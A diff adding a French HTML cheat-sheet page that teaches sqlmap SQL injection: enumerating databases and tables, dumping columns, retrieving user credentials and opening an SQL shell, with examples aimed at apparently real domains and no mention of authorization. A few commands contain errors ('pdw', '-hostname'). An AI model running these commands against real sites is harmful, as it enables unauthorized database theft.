@@ -1,0 +1,118 @@
+<meta charset="utf-8">
+<script src="assets/js/helpers.js"></script>
+<script>
+getHeader("Commandes", "Retrouvez ci-dessous les commandes utiles de Kali Linux");
+
+command(2, "Passer en mode administrateur", "user", "sudo su");
+
+command(3, "Nettoyer l'affichage", "admin", "clear");
+
+command(4, "Voir toutes les options possibles de la commande <code>sqlmap</code>", "admin", "sqlmap -h");
+
+command(5, "Scanner une URL", "admin", "sqlmap -u URL");
+comment("mb-5", "alert-secondary", 6, '<code class="text-warning">-u</code>signifie "utiliser"');
+comment("mb-5", "alert-secondary", 7, '<code class="text-warning">URL</code>designe une url <i class="text-gray-800">(https://...)</i>');
+example("mb-20", "alert-success", 8, "sqlmap -u https://irga.in/");
+
+command(9, "Tester les URLs de différents niveau N", "admin", "sqlmap -u URL --crawl N --batch");
+comment("mb-5", "alert-secondary", 10, '<code class="text-warning">--crawl</code>permet d\'analyser les différents niveaux d\'urls présents dans<code class="text-warning">URL</code>');
+comment("mb-5", "alert-secondary", 11, '<code class="text-warning">N</code>désigne un chiffre');
+comment("mb-5", "alert-secondary", 12, '<code class="text-warning">--batch</code>permet de répondre par défaut aux questions posées');
+example("mb-20", "alert-success", 13, "sqlmap -u https://irga.in/ --crawl 2 --batch");
+
+command(14, "Rechercher une base de données", "admin", "sqlmap -u URL?parameter=value --dbs --batch");
+comment("mb-5", "alert-secondary", 15, '<code class="text-warning">?parameter=value</code>désigne le paramètre de<code class="text-dark">URL</code>');
+comment("mb-5", "alert-secondary", 16, '<code class="text-warning">--dbs</code>permet d\'analyser la base de données d\'une url');
+example("mb-5", "alert-success", 17, "sqlmap -u https://ira.in/world_desc.php?id=1200 --dbs --batch");
+result("mb-20", "alert-success", 18, '<div class="highlight"><div class="text-start"><span class="text-gray-800">[ <font color="#00BFFF">HH:MM:SS</font> ] [ <font color="#3CB371">INFO</font> ] fetching databases names</span></div><div class="text-start"><span class="text-gray-800">available databases [ X ]:</span></div><div class="text-start"><span class="text-gray-800">[*] nom_base1</span></div><div class="text-start"><span class="text-gray-800">[*] nom_base2</span></div><div class="text-start"><span class="text-gray-800">...</span></div></div>');
+
+command(19, "Afficher les tables d'une base de données", "admin", "sqlmap -u URL?parameter=value -D nom_base --tables --batch");
+comment("mb-5", "alert-secondary", 20, '<code class="text-warning">-D</code>permet de renseigner le nom de la base de données');
+comment("mb-5", "alert-secondary", 21, '<code class="text-warning">nom_base</code>désigne le nom de la base de données');
+comment("mb-5", "alert-secondary", 22, '<code class="text-warning">--tables</code>permet d\'afficher les tables de la base de données');
+example("mb-5", "alert-success", 23, "sqlmap -u https://ira.in/world_desc.php?id=1200 -D irga_website --tables --batch");
+result("mb-20", "alert-success", 24, '<div class="highlight"><div class="text-start"><span class="text-gray-800">[ <font color="#00BFFF">HH:MM:SS</font> ] [ <font color="#3CB371">INFO</font> ] fetching tables for database: \'nom_base\'</span></div><div class="text-start"><span class="text-gray-800">Database: nom_base</span></div><div class="text-start"><span class="text-gray-800">[ X tables ]</span></div><div class="text-start"><span class="text-gray-800">+------------------+</span></div><div class="text-start"><span class="text-gray-800">| table_1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|</span></div><div class="text-start"><span class="text-gray-800">| table_2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|</span></div><div class="text-start"><span class="text-gray-800">| ...&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|</span></div><div class="text-start"><span class="text-gray-800">+------------------+</span></div></div>');
+
+command(25, "Afficher les données d'une table d'une base de données", "admin", "sqlmap -u URL?parameter=value -D nom_base -T nom_table --columns --batch");
+comment("mb-5", "alert-secondary", 26, '<code class="text-warning">-T</code>permet de renseigner le nom de la table');
+comment("mb-5", "alert-secondary", 27, '<code class="text-warning">nom_table</code>désigne le nom de la table');
+comment("mb-5", "alert-secondary", 28, '<code class="text-warning fs-5">--columns</code>rechercher les colonnes');
+example("mb-5", "alert-success", 29, "sqlmap -u https://ira.in/world_desc.php?id=1200 -D irga_website -T tbl_article --columns --batch");
+result("mb-20", "alert-success", 30, '<div class="highlight"><div class="text-start"><span class="text-gray-800">[ <font color="#00BFFF">HH:MM:SS</font> ] [ <font color="#3CB371">INFO</font> ] fetching columns for table \'nom_table\' in database \'nom_base\'</span></div><div class="text-start"><span class="text-gray-800">Database: nom_base</span></div><div class="text-start"><span class="text-gray-800">Table: nom_table</span></div><div class="text-start"><span class="text-gray-800">[ X columns ]</span></div><div class="text-start"><span class="text-gray-800">+--------------+----------------+</span></div><div class="text-start"><span class="text-gray-800">| Column&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| Type&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|</span></div><div class="text-start"><span class="text-gray-800">+--------------+----------------+</span></div><div class="text-start"><span class="text-gray-800">| column_1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| int(11)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|</span></div><div class="text-start"><span class="text-gray-800">| column_2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| varchar(255)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|</span></div><div class="text-start"><span class="text-gray-800">| column_3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| datetime&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|</span></div><div class="text-start"><span class="text-gray-800">| ...&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| ...&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|</span></div><div class="text-start"><span class="text-gray-800">+--------------+----------------+</span></div></div>');
+
+command(31, "Afficher les données d'une colonne d'une table d'une base de données", "admin", "sqlmap -u URL?parameter=value -D nom_base -T nom_table -C nom_colonne1, nom_colonneN --dump --batch");
+comment("mb-5", "alert-secondary", 32, '<code class="text-warning">-C</code>permet de renseigner le nom de la colonne');
+comment("mb-5", "alert-secondary", 33, '<code class="text-warning">nom_colonne</code>désigne le nom de la colonne');
+comment("mb-5", "alert-secondary", 34, '<code class="text-warning">--dump</code>permet d\'afficher les données de la/les colonne(s) sélectionnée(s)');
+example("mb-5", "alert-success", 35, "sqlmap -u https://ira.in/world_desc.php?id=1200 -D irga_website -T tbl_article -C art_id,art_title --dump --batch");
+result("mb-20", "alert-success", 36, '<div class="highlight"><div class="text-start"><span class="text-gray-800">[ <font color="#00BFFF">HH:MM:SS</font> ] [ <font color="#3CB371">INFO</font> ] fetching entries of column(s) \'nom_colonne,nom_colonne1,nom_colonneN\' for table \'nom_table\' in database \'nom_base\'</span></div><div class="text-start"><span class="text-gray-800">Database: nom_base</span></div><div class="text-start"><span class="text-gray-800">Table: nom_table</span></div><div class="text-start"><span class="text-gray-800">[ X entries ]</span></div><div class="text-start"><span class="text-gray-800">...</span></div></div>');
+</script>
+
+<div class="col-md-12 mb-10 reveal">
+	<div class="alert alert-primary border-light p-10 mx-md-5 h-md-100 reveal-37">
+		<div class="row d-flex justify-content-center">
+			<div class="col-auto">
+				<div class="alert alert-primary text-dark" role="alert">
+					<h3 class="text-center">
+						Retrouver les identifiants d'un utilisateur d'une base de données
+					</h3>
+				</div>
+			</div>
+		</div>
+		<div class="mb-5">
+			<div class="fs-4">
+				<div class="mb-10 mt-5">
+					<p class="text-dark text-start">1. Identifiez le nom de la table concerné</p>
+					<div class="highlight">
+						<div class="text-start"><span class="text-gray-700"><font color="#00BFFF">(</font><font color="red"><b> root@kali</b></font><font color="#00BFFF"> )-[</font> <font color="white"><b>/home/user</b></font> <font color="#00BFFF">]</font></span></div>
+						<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+						<div class="highlight-code">
+							<pre class="language-bash mt-2"><code class="language-bash fs-4">sqlmap -u URL?parameter=value -D nom_base --tables --batch</code></pre>
+						</div>
+					</div>
+				</div>
+				<div class="mb-10">
+					<p class="text-dark text-start">2. Affichez les colonnes de la tables sélectionné</p>
+					<div class="highlight">
+						<div class="text-start"><span class="text-gray-700"><font color="#00BFFF">(</font><font color="red"><b> root@kali</b></font><font color="#00BFFF"> )-[</font> <font color="white"><b>/home/user</b></font> <font color="#00BFFF">]</font></span></div>
+						<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+						<div class="highlight-code">
+							<pre class="language-bash mt-2"><code class="language-bash fs-4">sqlmap -u URL?parameter=value -D nom_base -T nom_table --columns --batch</code></pre>
+						</div>
+					</div>
+				</div>
+				<div class="mb-10">
+					<p class="text-dark text-start">3. Affichez les données des colonnes sélectionnées de la table</p>
+					<div class="highlight">
+						<div class="text-start"><span class="text-gray-700"><font color="#00BFFF">(</font><font color="red"><b> root@kali</b></font><font color="#00BFFF"> )-[</font> <font color="white"><b>/home/user</b></font> <font color="#00BFFF">]</font></span></div>
+						<button class="highlight-copy btn" data-bs-toggle="tooltip">copier</button>
+						<div class="highlight-code">
+							<pre class="language-bash mt-2"><code class="language-bash fs-4">sqlmap -u URL?parameter=value -D nom_base -T nom_table -C nom_colonne1, nom_colonneN --dump --batch</code></pre>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<script>
+command(38, "Afficher les données <i style='color: #FFF;'>(serveur)</i> courante de l'URL", "admin", "sqlmap -u URL?parameter=value --current-user --current-db -hostname --batch");
+comment("mb-5", "alert-secondary", 39, '<code class="text-warning">--current-user</code>affiche l\'administrateur connecté à la base de données.');
+comment("mb-5", "alert-secondary", 40, '<code class="text-warning">--current-db</code>affiche le nom de la base de données');
+comment("mb-5", "alert-secondary", 41, '<code class="text-warning">-hostname</code>affiche le serveur où la base de données est installé');
+example("mb-5", "alert-success", 42, "sqlmap -u https://irga.in/world_desc.php?id=1200 --current-user --current-db -hostname --batch");
+result("mb-20", "alert-success", 43, '<div class="highlight"> <div class="text-start"><span class="text-gray-800">[ <font color="#00BFFF">HH:MM:SS</font> ] [ <font color="#3CB371">INFO</font> ] fetching current user </span></div><div class="text-start"><span class="text-gray-800">current user: \'nom_admin\'</span></div> <div class="text-start"><span class="text-gray-800">[ <font color="#00BFFF">HH:MM:SS</font> ] [ <font color="#3CB371">INFO</font> ] fetching current database</span></div><div class="text-start"><span class="text-gray-800">current database: \'nom_base\'</span></div> <div class="text-start"><span class="text-gray-800">[ <font color="#00BFFF">HH:MM:SS</font> ] [ <font color="#3CB371">INFO</font> ] fetching server hostname </span></div><div class="text-start"><span class="text-gray-800">hostname: \'nom_server\'</span></div> </div>');
+
+command(44, "Ouvrir un shell", "admin", "sqlmap -u URL?parameter=value --sql-shell --batch");
+comment("mb-5", "alert-secondary", 45, '<code class="text-warning">--sql-shell</code>permet d\'ouvrir la console MySQL.');
+example("mb-5", "alert-success", 46, "sqlmap -u https://irga.in/world_desc.php?id=1200 --sql-shell --batch");
+result("mb-20", "alert-success", 47, '<div class="highlight"><div class="text-start"><span class="text-gray-800">[ <font color="#00BFFF">HH:MM:SS</font> ] [ <font color="#3CB371">INFO</font> ] calling MySQL shell. To quit \'x\' or \'q\' and press ENTER </span></div><div class="text-start"><span class="text-gray-800">sql-shell&gt;</span></div></div>');
+
+command(48, "Savoir dans quel(le) dossier/répertoire on se situe", "user", "pdw");
+result("mb-20", "alert-success", 49, '<div class="highlight"><div class="text-start"><span class="text-gray-800">/home/user</span></div></div>');
+
+nextButton(160, 50, "installations.html", "Installations");
+
+getFooter();
+</script>
